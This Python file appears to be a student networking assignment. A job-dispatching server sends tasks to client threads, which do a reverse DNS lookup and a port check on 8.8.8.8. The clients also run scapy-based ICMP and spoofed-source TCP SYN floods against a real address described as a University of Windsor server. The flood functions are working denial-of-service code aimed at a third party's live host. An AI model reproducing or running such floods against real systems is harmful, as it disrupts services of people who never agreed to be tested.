import socket
import sys
import os
import time
import threading
from jobcreator import JobCreatorNode
import random
from scapy.all import *

def new_client(server_address, client_id):

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    #Connection between Client and Server
    print("Client {0}: Attempting to connect to {1}".format(client_id, server_address[0]))
    client_socket.connect(server_address)
    print("Client {0}: Successfully connected to server".format(client_id))
    
    #Assigns Client ID to the Client on the Server
    client_socket.sendall(str(client_id).encode())
    
    #Communication between Client
    try:
        keep_connection = True
        while keep_connection:
            job_id = (client_socket.recv(1024)).decode()
            job = int(job_id)
            print("Cleint {0}: Recieved job - {1}".format(client_id, job))
           
            #Reject or Accept Job
            response = "COMPLETED {0}".format(job)
            if (random.randint(1,4) == 1):
                response = "REJECT"

            if (response != "REJECT"):
                if (job == 11):
                    detect_online("8.8.8.8") #detect google
                elif(job == 12):
                    detect_status("8.8.8.8", "993") #google's IMAP server
                elif(job == 21):
                    icmp_flood("137.207.71.196", 10) #flood uwindsor server
                elif(job == 22):
                    tcp_flood("137.207.71.196", 65535, 10) #flood uwindsor server
            
            print("Client {0}: {1}".format(client_id, response))
            client_socket.sendall(response.encode())
            
            #Server asking Client to do another Job
            job = (client_socket.recv(1024)).decode()
            print("Client {0}: Server asked to do another job".format(client_id))
            
            #Reject/Accept doing another Job
            if (random.randint(1,4) == 1):
                response = "NO"
                keep_connection = False
            else:
                response = "YES"
            
            print("Client {0}: Response - {1}".format(client_id, response))
            client_socket.sendall(response.encode())
        #Ending connection with Server
        print("Client {0}: Closing connection with server".format(client_id))
        client_socket.close()
    except:
        print("Client {0}: Closing connection with server".format(client_id))
        client_socket.close()

#end new_client


#might need to open a socket at the start of these
"""
A3. Q1. #1
"""
#checks to see if IP address or Host name is online
def detect_online(des_addr):
    try:
        host_name = socket.gethostbyaddr(des_addr)
        print("Hostname : ", host_name)
        print("IP : ", des_addr)
    except Exception as e:
        print("IP address is not online")
        print(e)
#end detect_online


"""
A3. Q1. #2
"""
def detect_status(des_addr, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        print("reached 12 - 1")
        print("please wait")
        s = (str(des_addr), int(port))
        check = sock.connect_ex(s)
        if(check == 0):
            print("port is OPEN")
        else:
            print("port is CLOSED")
    except Exception as e:
        print("12 FAILED")
        print(e)
#end detect_status

"""
A3. Q2. #1
"""
#crafts and sents ICMP packets num amount of times
def icmp_flood(des_addr, num):
    try:
        for x in range (0,num):
            packet = IP(dst=des_addr)/ICMP()
            send(packet, verbose=False)
        print("sent icmp flood to", des_addr)
    except Exception as e:
        print("21 failed")
        print(e)
#end icmp_flood


"""
A3. Q2. #2
"""
#crafts and sends a tcp syn packet to specified address num amount of times
def tcp_flood(des_addr, des_port, num):
    try:
        for i in range(0, num):
            packet = IP(src=RandIP("192.168.1.1/24"), dst=des_addr)/TCP(sport=RandShort(), dport=des_port, flags="S")/Raw("X")
            send(packet, verbose=False)
        print("sent tcp flood to", des_addr)
    except Exception as e:
        print("22 failed")
        print(e)
        
#end tcp_flood


#testing  

num_of_clients = int(input("How many clients? >"))

server_node = JobCreatorNode()

server_thread = threading.Thread(target=server_node.startServer, args=())
server_thread.start()

for i in range(0,num_of_clients):
    new_client_thread = threading.Thread(target=new_client, args=(server_node.getAddress(), i+1, ))
    new_client_thread.start()
